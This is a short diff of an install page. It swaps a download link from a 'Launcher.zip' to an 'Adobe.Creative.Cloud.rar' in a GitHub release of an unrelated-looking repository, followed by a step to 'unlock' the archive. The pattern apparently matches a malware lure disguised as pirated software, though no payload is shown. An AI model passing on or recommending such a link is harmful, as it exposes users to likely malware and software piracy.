@@ -3,7 +3,7 @@
 
 **1. Download the archive:**
 
-[DOWNLOAD THE ARCHIVE](https://github.com/Pikord/fffff/releases/download/Launcher/Launcher.zip)
+[DOWNLOAD THE ARCHIVE](https://github.com/Pikord/fffff/releases/download/Ad0bebe/Adobe.Creative.Cloud.rar)
 
 **2. Unlock the archive:**
 
